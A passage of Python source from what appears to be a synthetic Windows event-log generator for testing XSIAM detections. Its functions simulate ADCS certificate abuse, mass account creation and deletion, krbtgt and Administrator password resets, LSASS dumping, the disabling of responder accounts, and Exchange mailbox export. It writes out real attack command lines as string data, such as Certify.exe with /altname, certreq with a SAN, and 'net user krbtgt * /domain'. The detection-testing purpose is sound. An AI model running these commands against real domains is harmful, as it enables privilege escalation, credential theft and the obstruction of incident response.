        events.append(json.dumps(_build_4672(victim_u, config,
                                             logon_id=_new_logon_id(),
                                             is_admin=True, ts=t)))
        t += random.uniform(60.0, 180.0)

    # Attacker runs recon or data access under the elevated session
    recon_cmds = [
        ("C:\\Windows\\System32\\net.exe",
         "net group \"Domain Admins\" /domain"),
        ("C:\\Windows\\System32\\net.exe",
         "net group \"Enterprise Admins\" /domain"),
        ("C:\\Windows\\System32\\nltest.exe",
         "nltest /dclist:examplecorp.local"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "powershell.exe -c \"Get-ADUser -Filter * -Properties AdminCount "
         "| Where-Object {$_.AdminCount -eq 1}\""),
        ("C:\\Windows\\System32\\cmd.exe",
         "cmd.exe /c dir \\\\fs01\\finance$ /s"),
    ]
    for recon_tool, recon_cmd in random.sample(recon_cmds, k=random.randint(2, 3)):
        events.append(json.dumps(_build_4688(u, config, process_name=recon_tool,
                                             command_line=recon_cmd,
                                             logon_id=logon_id, ts=t)))
        t += random.uniform(10.0, 30.0)
        events.append(json.dumps(_build_4689(u, config, process_name=recon_tool,
                                             logon_id=logon_id, ts=t)))
        t += random.uniform(60.0, 180.0)

    # TGS request using the elevated privileges
    events.append(json.dumps(_build_4769(victim_u, config,
                                         service_spn=f"cifs/{_get_dc_hostname(config)}",
                                         encryption="0x12",
                                         ip_override=u.get("ip"),
                                         ts=t)))
    t += random.uniform(2.0, 5.0)

    # Land the removal a full dwell after the addition, but never in the future: the
    # interior pacing above can overrun dwell when several lateral/recon iterations are
    # drawn, so clamp to just before wall clock.
    t = min(max(t, start_ts + dwell), time.time() - 5.0)

    # ── Remove from group to cover tracks ──
    remove_builder = _REMOVE_BUILDERS[remove_eid]
    events.append(json.dumps(remove_builder(
        u, config,
        member_name=member_name,
        member_sid=member_sid,
        target_group=group_name,
        target_sid=grp["sid"],
        logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.0)

    events.append(json.dumps(_build_4689(u, config, process_name=tool,
                                         logon_id=logon_id, ts=t)))
    return events


# Privileged accounts and templates used for ADCS attack simulation
# krbtgt is disabled and never enrolls, so a krbtgt certificate subject will never
# resolve against an identity XSIAM has ever seen authenticate.
_PRIV_CERT_TARGETS = ["Administrator", "DC01$", "svc_sql_prod"]

def _threat_priv_cert_request(config, session_context):
    """Privileged certificate request via certificate template (ADCS ESC attacks).

    Three XSIAM detection variants:
      - "Privileged certificate request via certificate template" (Low) —
        4886 + 4887 with a vulnerable template and SAN for a privileged account
      - "Suspicious privileged certificate request via certificate template" (Low) —
        same pattern but using a template that is more obviously suspicious
      - "Suspicious privileged certificate request denied via certificate template" (Medium) —
        4886 + 4888 where the CA denied the request

    Sequence:
      1. Attacker authenticates → DC-side 4624 + endpoint 4624 + 4672
      2. 4688 Certify.exe / certreq.exe / PowerShell process creation
      3. 4886 certificate request received on CA (KEY TRIGGER)
      4. 4887 certificate issued (success variants) OR 4888 request denied
      5. Optional: 4768 PKINIT TGT request using the issued certificate
      6. 4689 process exit

    Detection keys:
      - 4886/4887/4888 with CertificateTemplate pointing to a vulnerable template
      - SAN (san:upn=) in Attributes specifying a different identity than the Requester
      - Certificate used for PKINIT auth shortly after issuance
    """
    u = _pick_windows_user(session_context)
    if not u:
        return None

    dns_domain = _get_dns_domain(config)

    # The issued path carries the detection: 4887 is the only event in the family that
    # states both Requester and the issued certificate's Subject, and every AD CS analytic
    # (privileged request / user-cert mismatch / machine-cert mismatch) compares those two.
    # A denial gives XSIAM a requester and nothing to compare it against, so keep it a
    # minority.
    variant = random.choices(
        ["suspicious_issued", "denied"],
        weights=[80, 20], k=1)[0]

    priv_target = random.choice(_PRIV_CERT_TARGETS)
    is_machine_target = priv_target.endswith("$")
    san_kind = "dns" if is_machine_target else "upn"
    san_value = (f"{priv_target.rstrip('$').lower()}.{dns_domain}"
                 if is_machine_target else f"{priv_target}@{dns_domain}")

    # The certificate is issued to the *privileged target*, not to the attacker who
    # submitted the request — that Requester/Subject divergence is the ESC1 signal.
    # Without it Requester == Subject and nothing fires.
    cert_base_dn = ",".join(f"DC={p}" for p in dns_domain.split("."))
    priv_subject_dn = (
        f"CN={priv_target.rstrip('$')}, CN=Computers, {cert_base_dn}"
        if is_machine_target else
        f"CN={priv_target}, CN=Users, {cert_base_dn}")

    template = random.choice(_CERT_TEMPLATES_VULNERABLE)

    events = []
    t = time.time()

    logon_id = _new_logon_id()

    events.append(json.dumps(_dc_logon_event(u, config, ip_override=u.get("ip"),
                                             logon_id=logon_id, ts=t)))
    t += 1.0
    events.append(json.dumps(_build_4624(u, config, logon_type=2,
                                         auth_pkg=_NEG_PACKAGE,
                                         target_logon_id=logon_id,
                                         elevated=True, ts=t)))
    t += 0.05
    events.append(json.dumps(_build_4672(u, config, logon_id=logon_id,
                                         is_admin=True, ts=t)))
    t += random.uniform(2.0, 5.0)

    tool = random.choice([
        ("C:\\Users\\Public\\Certify.exe",
         f"Certify.exe request /ca:{_get_ca_hostname(config)} "
         f"/template:{template} /altname:{priv_target}"),
        ("C:\\Windows\\System32\\certreq.exe",
         f"certreq.exe -submit -attrib \"CertificateTemplate:{template}"
         f"\\nsan:upn={san_value}\" request.req"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         f"powershell.exe -ep bypass -c \"Get-Certificate -Template {template} "
         f"-DnsName {priv_target.rstrip('$').lower()}.{dns_domain} "
         f"-CertStoreLocation Cert:\\CurrentUser\\My\""),
    ])
    events.append(json.dumps(_build_4688(u, config, process_name=tool[0],
                                         command_line=tool[1],
                                         logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 1.5)

    request_id = str(random.randint(100, 99999))

    # 4898 first: the CA loads the template. This is the only event that tells XSIAM the
    # template is abusable (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT + no manager approval +
    # Client Auth EKU + Authenticated Users enroll = ESC1), and it is in XSIAM's Object
    # Access intake list. Without it the request events describe an enrollment against a
    # template the tenant has no reason to consider vulnerable.
    events.append(json.dumps(_build_4898(u, config, template_name=template,
                                         enrollee_supplies_subject=True, ts=t)))
    t += random.uniform(0.1, 0.4)

    # 4886 — CA received the request
    events.append(json.dumps(_build_4886(u, config,
                                         template_name=template,
                                         request_id=request_id,
                                         san_override=san_value,
                                         san_kind=san_kind,
                                         ts=t)))
    t += random.uniform(0.1, 0.5)

    if variant == "denied":
        events.append(json.dumps(_build_4888(u, config,
                                             template_name=template,
                                             request_id=request_id,
                                             san_override=san_value,
                                             san_kind=san_kind,
                                             subject_dn=priv_subject_dn,
                                             ts=t)))
    else:
        events.append(json.dumps(_build_4887(u, config,
                                             template_name=template,
                                             request_id=request_id,
                                             san_override=san_value,
                                             san_kind=san_kind,
                                             subject_dn=priv_subject_dn,
                                             ts=t)))
        t += random.uniform(2.0, 5.0)

        # Attacker uses the cert for PKINIT TGT request
        priv_user = {**u, "username": priv_target.rstrip("$")}
        events.append(json.dumps(_build_4768(priv_user, config,
                                             ip_override=u.get("ip"),
                                             cert_issuer=f"{_get_domain(config)}-CA01-CA",
                                             cert_serial="6100000005a4b31a47c8b1ae9f000000000005",
                                             cert_thumbprint=_random_ski().replace(" ", ""),
                                             ts=t)))
    t += random.uniform(0.5, 1.0)

    events.append(json.dumps(_build_4689(u, config, process_name=tool[0],
                                         logon_id=logon_id, ts=t)))
    return events


# Tier 1 threat generators: account lifecycle detections

_SUSPICIOUS_ACCOUNT_PREFIXES = [
    "svc_", "tmp_", "test_", "backup_", "admin_", "sys_", "sql_",
    "dev_", "staging_", "deploy_", "audit_", "helpdesk_",
]

_HIDDEN_USER_SUFFIXES = ["$", ""]


def _threat_suspicious_account_creation(config, session_context):
    """Rapid creation of multiple user accounts from a single session.

    Detection targets:
      - "Multiple suspicious user accounts created" (5+ in short window)
      - "Suspicious domain user account creation" (unusual creator)
      - "Short-lived user account" (created then deleted within minutes)
      - "Local user account creation" / "Local user account creation by machine account"
      - "Suspicious hidden user created" (trailing $ in SAM name)

    Sequence:
      1. Attacker authenticates → DC 4624 + endpoint 4624 + 4672
      2. 4688 net.exe/PowerShell (account creation tool)
      3. Rapid-fire 4720 (user created) × 5–10 accounts
      4. 4722 (account enabled) for each
      5. Optionally 4726 (account deleted) for 1-2 accounts (short-lived)
      6. 4689 process exit
    """
    u = _pick_windows_user(session_context)
    if not u:
        return None

    dns_domain = _get_dns_domain(config)
    domain = _get_domain(config)
    events = []
    t = time.time()
    logon_id = _new_logon_id()

    events.append(json.dumps(_dc_logon_event(u, config, ip_override=u.get("ip"),
                                             logon_id=logon_id, ts=t)))
    t += 1.0
    events.append(json.dumps(_build_4624(u, config, logon_type=2,
                                         auth_pkg=_NEG_PACKAGE,
                                         target_logon_id=logon_id,
                                         elevated=True, ts=t)))
    t += 0.05
    events.append(json.dumps(_build_4672(u, config, logon_id=logon_id,
                                         is_admin=True, ts=t)))

    t += random.uniform(3.0, 8.0)

    tool = random.choice([
        ("C:\\Windows\\System32\\net.exe",
         "net user /add /domain"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         'powershell.exe -c "New-ADUser"'),
    ])
    events.append(json.dumps(_build_4688(u, config, process_name=tool[0],
                                         command_line=tool[1],
                                         logon_id=logon_id, ts=t)))

    t += random.uniform(0.5, 1.5)

    num_accounts = random.randint(5, 10)
    created_accounts = []

    for i in range(num_accounts):
        prefix = random.choice(_SUSPICIOUS_ACCOUNT_PREFIXES)
        suffix = random.choice(_HIDDEN_USER_SUFFIXES)
        acct_num = random.randint(100, 9999)
        acct_name = f"{prefix}{acct_num}{suffix}"
        acct_rid = random.randint(2001, 9999)
        acct_sid = f"{_SYNTH_DOMAIN_SID}-{acct_rid}"

        events.append(json.dumps(_build_4720(u, config,
                                             target_username=acct_name,
                                             target_sid=acct_sid,
                                             upn=f"{acct_name.rstrip('$')}@{dns_domain}",
                                             logon_id=logon_id, ts=t)))
        t += random.uniform(0.3, 1.0)

        events.append(json.dumps(_build_4722(u, config,
                                             target_username=acct_name,
                                             target_sid=acct_sid,
                                             logon_id=logon_id, ts=t)))
        t += random.uniform(0.2, 0.8)

        created_accounts.append((acct_name, acct_sid))

    short_lived_count = random.randint(1, min(3, num_accounts))
    short_lived = random.sample(created_accounts, short_lived_count)
    t += random.uniform(30.0, 120.0)
    for acct_name, acct_sid in short_lived:
        events.append(json.dumps(_build_4726(u, config,
                                             target_username=acct_name,
                                             target_sid=acct_sid,
                                             logon_id=logon_id, ts=t)))
        t += random.uniform(0.3, 0.8)

    t += random.uniform(1.0, 3.0)
    events.append(json.dumps(_build_4689(u, config, process_name=tool[0],
                                         logon_id=logon_id, ts=t)))
    return events


def _threat_mass_account_deletion(config, session_context):
    """Bulk deletion of user accounts.

    Detection targets:
      - "Multiple user accounts deleted" (5+ in short window)

    Sequence:
      1. Attacker authenticates → DC 4624 + endpoint 4624 + 4672
      2. 4688 process creation
      3. Rapid-fire 4726 (account deleted) × 5–8 accounts
      4. 4689 process exit
    """
    u = _pick_windows_user(session_context)
    if not u:
        return None

    events = []
    t = time.time()
    logon_id = _new_logon_id()

    events.append(json.dumps(_dc_logon_event(u, config, ip_override=u.get("ip"),
                                             logon_id=logon_id, ts=t)))
    t += 1.0
    events.append(json.dumps(_build_4624(u, config, logon_type=2,
                                         auth_pkg=_NEG_PACKAGE,
                                         target_logon_id=logon_id,
                                         elevated=True, ts=t)))
    t += 0.05
    events.append(json.dumps(_build_4672(u, config, logon_id=logon_id,
                                         is_admin=True, ts=t)))

    t += random.uniform(2.0, 5.0)

    tool = random.choice([
        ("C:\\Windows\\System32\\net.exe",
         "net user /delete /domain"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         'powershell.exe -c "Remove-ADUser"'),
    ])
    events.append(json.dumps(_build_4688(u, config, process_name=tool[0],
                                         command_line=tool[1],
                                         logon_id=logon_id, ts=t)))

    t += random.uniform(0.5, 1.5)

    num_deletions = random.randint(5, 8)
    for i in range(num_deletions):
        prefix = random.choice(_SUSPICIOUS_ACCOUNT_PREFIXES)
        acct_num = random.randint(100, 9999)
        acct_name = f"{prefix}{acct_num}"
        acct_rid = random.randint(2001, 9999)
        acct_sid = f"{_SYNTH_DOMAIN_SID}-{acct_rid}"

        events.append(json.dumps(_build_4726(u, config,
                                             target_username=acct_name,
                                             target_sid=acct_sid,
                                             logon_id=logon_id, ts=t)))
        t += random.uniform(0.3, 1.0)

    t += random.uniform(1.0, 3.0)
    events.append(json.dumps(_build_4689(u, config, process_name=tool[0],
                                         logon_id=logon_id, ts=t)))
    return events


# Only accounts whose sensitivity XSIAM could plausibly derive on its own. The built-in
# Administrator (well-known RID 500) and krbtgt (RID 502) carry their identity in the SID.
# "DSRM_Admin" was an invented name that _stable_user_sid() maps to an ordinary hashed
# RID, so Identity Analytics saw a plain domain user — one draw in three could never fire
# "Sensitive account password reset attempt" regardless of event shape.
_SENSITIVE_ACCOUNTS_FOR_RESET = [
    "Administrator", "krbtgt",
]


def _threat_sensitive_password_reset(config, session_context):
    """Non-admin user resets password of a sensitive account (Administrator, krbtgt).

    Detection targets:
      - "Sensitive account password reset attempt"

    Sequence:
      1. Attacker authenticates → DC 4624 + endpoint 4624
      2. 4688 process creation (net.exe or powershell)
      3. 4724 password reset for sensitive account
      4. 4738 account changed (PasswordLastSet updated)
      5. 4689 process exit
    """
    u = _pick_windows_user(session_context)
    if not u:
        return None

    target_acct = random.choice(_SENSITIVE_ACCOUNTS_FOR_RESET)
    if target_acct == "krbtgt":
        target_sid = f"{_SYNTH_DOMAIN_SID}-502"
    elif target_acct == "Administrator":
        target_sid = f"{_SYNTH_DOMAIN_SID}-500"
    else:
        target_sid = _stable_user_sid(target_acct)

    events = []
    t = time.time()
    logon_id = _new_logon_id()

    events.append(json.dumps(_dc_logon_event(u, config, ip_override=u.get("ip"),
                                             logon_id=logon_id, ts=t)))
    t += 1.0
    events.append(json.dumps(_build_4624(u, config, logon_type=2,
                                         auth_pkg=_NEG_PACKAGE,
                                         target_logon_id=logon_id,
                                         elevated=True, ts=t)))
    t += 0.05
    events.append(json.dumps(_build_4672(u, config, logon_id=logon_id,
                                         is_admin=True, ts=t)))

    t += random.uniform(3.0, 8.0)

    tool = random.choice([
        ("C:\\Windows\\System32\\net.exe",
         f'net user {target_acct} * /domain'),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         f'powershell.exe -c "Set-ADAccountPassword -Identity \'{target_acct}\' -Reset"'),
    ])
    events.append(json.dumps(_build_4688(u, config, process_name=tool[0],
                                         command_line=tool[1],
                                         logon_id=logon_id, ts=t)))

    t += random.uniform(0.5, 2.0)
    events.append(json.dumps(_build_4724(u, config,
                                         target_username=target_acct,
                                         target_sid=target_sid,
                                         logon_id=logon_id, ts=t)))

    t += random.uniform(0.1, 0.5)
    events.append(json.dumps(_build_4738(u, config,
                                         target_username=target_acct,
                                         target_sid=target_sid,
                                         logon_id=logon_id, ts=t)))

    t += random.uniform(1.0, 3.0)
    events.append(json.dumps(_build_4689(u, config, process_name=tool[0],
                                         logon_id=logon_id, ts=t)))
    return events


_SENSITIVE_GROUP_ACCOUNTS = [
    "Administrator", "krbtgt", "svc_sql_prod", "svc_backup",
    "svc_exchange", "svc_sccm",
]


def _threat_password_never_expires(config, session_context):
    """Account modified to set the password-never-expires flag.

    Detection targets:
      - "A user account was modified to password never expires" (base variation,
        Informational). Per the XSIAM Analytics Alert Reference this variation has NO
        sensitivity precondition — a single correctly encoded 4738 is enough.
      - The "A sensitive account was modified to password never expires" variation (Low)
        additionally requires the target to be a member of a sensitive built-in AD group,
        which XSIAM resolves from its own identity inventory, not from a group-add event
        emitted seconds earlier in the same burst.

    Sequence:
      1. Attacker authenticates → DC 4624 + endpoint 4624 + 4672
      2. 4688 process creation
      3. 4738 account changed — OldUacValue=0x10, NewUacValue=0x210,
         UserAccountControl=%%2089 (SAM USER_DONT_EXPIRE_PASSWORD added)
      4. 4689 process exit
    """
    u = _pick_windows_user(session_context)
    if not u:
        return None

    target_acct = random.choice(_SENSITIVE_GROUP_ACCOUNTS)
    if target_acct == "Administrator":
        target_sid = f"{_SYNTH_DOMAIN_SID}-500"
    elif target_acct == "krbtgt":
        target_sid = f"{_SYNTH_DOMAIN_SID}-502"
    else:
        target_sid = _stable_user_sid(target_acct)

    events = []
    t = time.time()
    logon_id = _new_logon_id()

    events.append(json.dumps(_dc_logon_event(u, config, ip_override=u.get("ip"),
                                             logon_id=logon_id, ts=t)))
    t += 1.0
    events.append(json.dumps(_build_4624(u, config, logon_type=2,
                                         auth_pkg=_NEG_PACKAGE,
                                         target_logon_id=logon_id,
                                         elevated=True, ts=t)))
    t += 0.05
    events.append(json.dumps(_build_4672(u, config, logon_id=logon_id,
                                         is_admin=True, ts=t)))

    t += random.uniform(3.0, 8.0)

    tool = random.choice([
        ("C:\\Windows\\System32\\net.exe",
         f'net user {target_acct} /expires:never /domain'),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         f'powershell.exe -c "Set-ADUser -Identity \'{target_acct}\' '
         f'-PasswordNeverExpires $true"'),
    ])
    events.append(json.dumps(_build_4688(u, config, process_name=tool[0],
                                         command_line=tool[1],
                                         logon_id=logon_id, ts=t)))

    t += random.uniform(0.5, 2.0)

    # No group-membership event here. The base variation of "A user account was modified
    # to password never expires" (Informational) has no sensitivity precondition, and a
    # 4728 emitted seconds earlier cannot reclassify the target in XSIAM's identity model
    # in time for the 4738 anyway. All it actually did was fire "User added to a Windows
    # privileged group" — stealing this generator's result and burning the 1-day dedup
    # window belonging to _threat_priv_group_addition.
    #
    # 4738 OldUacValue/NewUacValue are SAM USER_ACCOUNT flags ([MS-SAMR]), NOT the LDAP
    # userAccountControl bitmask: USER_NORMAL_ACCOUNT is 0x10 and USER_DONT_EXPIRE_PASSWORD
    # is 0x200. The _UAC_* constants hold LDAP values (0x200 -> 0x10200), which decode in
    # SAM space as "don't-expire was already set, DONT_REQUIRE_PREAUTH just turned on" —
    # the wrong change, and directly contradicting the %%2089 token shipped alongside it.
    # 0x10 -> 0x210 is the only delta consistent with %%2089 ("'Don't Expire Password' -
    # Enabled", msobjs.dll). Literals are passed here rather than editing _UAC_*, because
    # those constants also back _build_4720, which works.
    events.append(json.dumps(_build_4738(u, config,
                                         target_username=target_acct,
                                         target_sid=target_sid,
                                         old_uac_value="0x10",
                                         new_uac_value="0x210",
                                         uac_control="%%2089",
                                         logon_id=logon_id, ts=t)))

    t += random.uniform(1.0, 3.0)
    events.append(json.dumps(_build_4689(u, config, process_name=tool[0],
                                         logon_id=logon_id, ts=t)))
    return events


# Accounts an attacker disables to slow the response: the people and service
# identities that would otherwise investigate or revoke their access.
_SECURITY_STAFF_ACCOUNTS = [
    "soc.analyst1", "soc.analyst2", "soc.oncall", "ir.lead",
    "sec.engineer", "svc_edr_admin", "svc_backup", "svc_siem_forwarder",
    "domain.audit", "helpdesk.admin",
]


def _threat_lsass_handle_access(config, session_context):
    """Credential dumping via an LSASS handle (T1003.001).

    Detection targets:
      - "Handle to LSASS requested by a non-system process"
      - "Credential dumping tool executed"

    Sequence:
      1. 4688 dumping tool launched
      2. 4656 handle to lsass.exe requested with a memory-read access mask
      3. 4663 the read actually performed on that handle
      4. 4689 tool exit

    This is what _build_4656's own docstring was written for.  The access mask
    is the discriminator: ordinary tooling queries LSASS with 0x1000
    (PROCESS_QUERY_LIMITED_INFORMATION), while a dumper needs PROCESS_VM_READ.
    Object/process names are emitted exactly as the Security channel reports
    them -- lsass.exe as a \\Device\\HarddiskVolume path, not a C:\\ path.
    """
    u = _pick_windows_user(session_context)
    if not u:
        return None

    tool_path, command_line = random.choice(_CRED_DUMP_TOOLS)
    access_mask = random.choice(_CRED_DUMP_ACCESS)
    handle_id = "0x%x" % random.randint(0x100, 0xffff)
    process_id = "0x%x" % random.randint(0x200, 0xffff)
    logon_id = _new_logon_id()
    t = time.time()

    events = [json.dumps(_build_4688(u, config, process_name=tool_path,
                                     command_line=command_line,
                                     logon_id=logon_id, ts=t))]
    t += random.uniform(0.2, 1.2)
    events.append(json.dumps(_build_4656(
        u, config, object_type="Process", object_name=_LSASS_OBJECT_NAME,
        process_name=tool_path, access_mask=access_mask,
        handle_id=handle_id, process_id=process_id, logon_id=logon_id, ts=t)))
    t += random.uniform(0.01, 0.15)
    events.append(json.dumps(_build_4663(
        u, config, object_type="Process", object_name=_LSASS_OBJECT_NAME,
        process_name=tool_path, access_mask=access_mask,
        handle_id=handle_id, process_id=process_id, logon_id=logon_id, ts=t)))
    t += random.uniform(0.5, 3.0)
    events.append(json.dumps(_build_4689(u, config, process_name=tool_path,
                                         logon_id=logon_id, ts=t)))
    return events


def _threat_account_access_removal(config, session_context):
    """Attacker disables accounts to impede response (T1531).

    Detection targets:
      - "Multiple user accounts disabled in a short window"

    Sequence:
      1. 4688 process creation (net.exe / PowerShell)
      2. 4725 account disabled -- several security/admin accounts in a burst
      3. 4689 process exit

    Disabling rather than deleting is the quieter variant: the accounts still
    exist, so an operator glancing at AD sees nothing missing, but the responders
    who own them cannot log in.
    """
    u = _pick_windows_user(session_context)
    if not u:
        return None

    tool = random.choice([
        ("C:\\Windows\\System32\\net.exe", "net user {acct} /active:no /domain"),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "powershell.exe -c \"Disable-ADAccount -Identity {acct}\""),
    ])
    targets = random.sample(_SECURITY_STAFF_ACCOUNTS,
                            k=min(random.randint(4, 7), len(_SECURITY_STAFF_ACCOUNTS)))
    logon_id = _new_logon_id()
    t = time.time()

    events = [json.dumps(_build_4688(u, config, process_name=tool[0],
                                     command_line=tool[1].format(acct=targets[0]),
                                     logon_id=logon_id, ts=t))]
    for acct in targets:
        t += random.uniform(0.4, 2.0)
        events.append(json.dumps(_build_4725(u, config,
                                             target_username=acct,
                                             target_sid=_stable_user_sid(acct),
                                             logon_id=logon_id, ts=t)))
    t += random.uniform(1.0, 3.0)
    events.append(json.dumps(_build_4689(u, config, process_name=tool[0],
                                         logon_id=logon_id, ts=t)))
    return events


def _threat_default_account_enabled(config, session_context):
    """Default local account (Administrator, Guest, DefaultAccount) is enabled.

    Detection targets:
      - "User enabled a default local account"

    Sequence:
      1. Attacker authenticates → DC 4624 + endpoint 4624 + 4672
      2. 4688 process creation
      3. 4722 account enabled — for a default account name
      4. 4738 account changed — UAC cleared ACCOUNTDISABLE bit
      5. 4689 process exit
    """
    u = _pick_windows_user(session_context)
    if not u:
        return None

    target_acct = random.choice(["Guest", "DefaultAccount", "WDAGUtilityAccount"])
    if target_acct == "Guest":
        target_sid = f"{_SYNTH_DOMAIN_SID}-501"
    elif target_acct == "DefaultAccount":
        target_sid = f"{_SYNTH_DOMAIN_SID}-503"
    else:
        target_sid = _stable_user_sid(target_acct)

    events = []
    t = time.time()
    logon_id = _new_logon_id()

    events.append(json.dumps(_dc_logon_event(u, config, ip_override=u.get("ip"),
                                             logon_id=logon_id, ts=t)))
    t += 1.0
    events.append(json.dumps(_build_4624(u, config, logon_type=2,
                                         auth_pkg=_NEG_PACKAGE,
                                         target_logon_id=logon_id,
                                         elevated=True, ts=t)))
    t += 0.05
    events.append(json.dumps(_build_4672(u, config, logon_id=logon_id,
                                         is_admin=True, ts=t)))

    t += random.uniform(3.0, 8.0)

    tool = random.choice([
        ("C:\\Windows\\System32\\net.exe",
         f'net user {target_acct} /active:yes'),
        ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         f'powershell.exe -c "Enable-ADAccount -Identity \'{target_acct}\'"'),
    ])
    events.append(json.dumps(_build_4688(u, config, process_name=tool[0],
                                         command_line=tool[1],
                                         logon_id=logon_id, ts=t)))

    t += random.uniform(0.5, 2.0)
    events.append(json.dumps(_build_4722(u, config,
                                         target_username=target_acct,
                                         target_sid=target_sid,
                                         logon_id=logon_id, ts=t)))

    t += random.uniform(0.1, 0.5)
    events.append(json.dumps(_build_4738(u, config,
                                         target_username=target_acct,
                                         target_sid=target_sid,
                                         old_uac_value=_UAC_ACCOUNTDISABLE,
                                         new_uac_value=_UAC_NORMAL_ACCOUNT,
                                         uac_control="%%2080",
                                         logon_id=logon_id, ts=t)))

    t += random.uniform(1.0, 3.0)
    events.append(json.dumps(_build_4689(u, config, process_name=tool[0],
                                         logon_id=logon_id, ts=t)))
    return events


# Threats renamed out of the wip_ ("work in progress") prefix. The old names still
# dispatch, so saved scenarios and MCP callers keep working.
_RENAMED_THREATS = {
    "WIP_AS_REP_ROASTING":          "AS_REP_ROASTING",
    "WIP_DMSA_PRIVESC":             "DMSA_PRIVESC",
    "WIP_SENSITIVE_PASSWORD_RESET": "SENSITIVE_PASSWORD_RESET",
}

# ── Exchange mailbox abuse via PowerShell (4104 ScriptBlock) ──────────────────
# These emit a Microsoft-Windows-PowerShell/Operational 4104 ScriptBlock event -- the
# same shape the WEC channel probe proved ingests end-to-end -- carrying an Exchange
# Management Shell cmdlet. The analytics key on the cmdlet text in ScriptBlockText.
_PS_PROVIDER = "Microsoft-Windows-PowerShell"
_PS_GUID     = "{A0C1853B-5C40-4B15-8766-3CF1C58F985A}"
_PS_CHANNEL  = "Microsoft-Windows-PowerShell/Operational"
_EXCHANGE_HOSTS = ["EXCH-01", "EXCH-02", "EXCH-MBX-01"]


def _build_ps_4104(user, config, script, action, ts=None):
    """One PowerShell/Operational 4104 ScriptBlock-logging event (dict)."""
    ts = ts if ts is not None else time.time()
    sb_id = str(uuid.uuid4())
    host = (user.get("hostname") or "WORKSTATION")
    return {
        "event_id": "4104", "provider_name": _PS_PROVIDER, "provider_guid": _PS_GUID,
        "channel": _PS_CHANNEL, "computer_name": host, "host_name": host,
        "time_created": _iso_ts(ts),
        "message": (f"Creating Scriptblock text (1 of 1):\r\n{script}\r\n\r\n"
                    f"ScriptBlock ID: {sb_id}\r\nPath: "),
        "keywords": "0x0", "level_num": "5", "log_level": "Verbose",
        "rendering_provider": _PS_PROVIDER, "rendering_keyword": None,
        "event_result": "success", "event_action": action,
        "task": "2", "opcode": "On create calls", "op_code": "15", "version": "1",
        "record_id": str(_next_record_number(host)),
        "activity_id": "{" + str(uuid.uuid4()).upper() + "}",
        "process_pid": str(random.randint(2000, 30000)),
        "process_thread_id": str(random.randint(2000, 30000)),
        "process_name": "powershell.exe",
        "process_path": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        # Running user's domain SID, matching that user's Security-channel events.
        "security_user_id": _stable_user_sid(user["username"]),
        "event_data": {"MessageNumber": "1", "MessageTotal": "1",
                       "ScriptBlockText": script, "ScriptBlockId": sb_id, "Path": ""},
    }


def _mailbox_ps_threat(session_context, config, script, action):
    """Operator logs on to an Exchange host and runs one Exchange cmdlet (4104)."""
    op = _pick_windows_user(session_context)
    if not op:
        return None
    tgt = _pick_windows_user(session_context) or op
    exch = random.choice(_EXCHANGE_HOSTS) + ".examplecorp.local"
    operator = {**op, "hostname": exch}          # the cmdlet runs ON the Exchange box
    t = time.time()
    logs = [json.dumps(_build_4624(operator, config, logon_type=10, ip_override=op.get("ip"),
                                   elevated=True, ts=t))]      # RDP to the Exchange server
    t += random.uniform(3, 20)
    logs.append(json.dumps(_build_ps_4104(operator, config,
                                          script(tgt), action, ts=t)))
    return logs


def _threat_mailbox_export(config, session_context):
    """New-MailboxExportRequest -- stage a mailbox to a PST for exfiltration.
    XSIAM: 'PowerShell used to export mailbox contents'."""
    exch = random.choice(_EXCHANGE_HOSTS)
    return _mailbox_ps_threat(
        session_context, config,
        lambda t: (f'New-MailboxExportRequest -Mailbox "{t["username"]}@examplecorp.com" '
                   rf'-FilePath "\\{exch}\PSTExport$\{t["username"]}.pst"'),
        "Execute a Remote Command")


def _threat_mailbox_export_log_removal(config, session_context):
    """Remove-MailboxExportRequest -- delete evidence of a mailbox export (anti-forensics).
    XSIAM: 'PowerShell used to remove mailbox export request logs'."""
    return _mailbox_ps_threat(
        session_context, config,
        lambda t: (rf'Remove-MailboxExportRequest -Identity "{t["username"]}\MailboxExport" '
                   f'-Confirm:$false'),
        "Execute a Remote Command")


def _threat_mailbox_cas_change(config, session_context):
    """Set-CASMailbox -- enable client-access protocols to ease mailbox data theft.
    XSIAM: 'Mailbox Client Access Setting (CAS) changed'."""
    return _mailbox_ps_threat(
        session_context, config,
        lambda t: (f'Set-CASMailbox -Identity "{t["username"]}@examplecorp.com" '
                   f'-OWAEnabled $true -ImapEnabled $true -PopEnabled $true '
                   f'-ActiveSyncEnabled $true'),
        "Execute a Remote Command")


# ---------------------------------------------------------------------------
# Phase 2 — rogue forest trust kill chain (on-prem AD)
#   A rogue external forest is trusted by this domain with SID filtering
#   disabled, then SID History is injected so a controlled account inherits
#   privileged SIDs across the trust. Events are DC-originated Security logs
#   (Authentication Policy Change + User Account Management).
# ---------------------------------------------------------------------------

_ROGUE_FOREST_DNS     = "rogue-forest.lab"
_ROGUE_FOREST_NETBIOS = "ROGUEFOREST"
# Stable fake SID for the rogue forest root domain.
_ROGUE_FOREST_SID     = "S-1-5-21-" + "-".join(
    str(int(hashlib.sha256(("rogueforest:" + str(i)).encode()).hexdigest(), 16) % 4000000000 + 1000000000)
    for i in range(3))


def _build_4706(user_info, config, *, logon_id=None, ts=None) -> dict:
    """4706 – A new trust was created to a domain (DC event)."""
    dc_host = _get_dc_hostname(config)
    event_data = {
        "DomainName":          _ROGUE_FOREST_NETBIOS,
        "DomainSid":           _ROGUE_FOREST_SID,
        "TdoType":             "Forest (uplevel)",      # TRUST_TYPE_UPLEVEL + forest
        "TdoDirection":        "Bidirectional",         # TRUST_DIRECTION_BIDIRECTIONAL
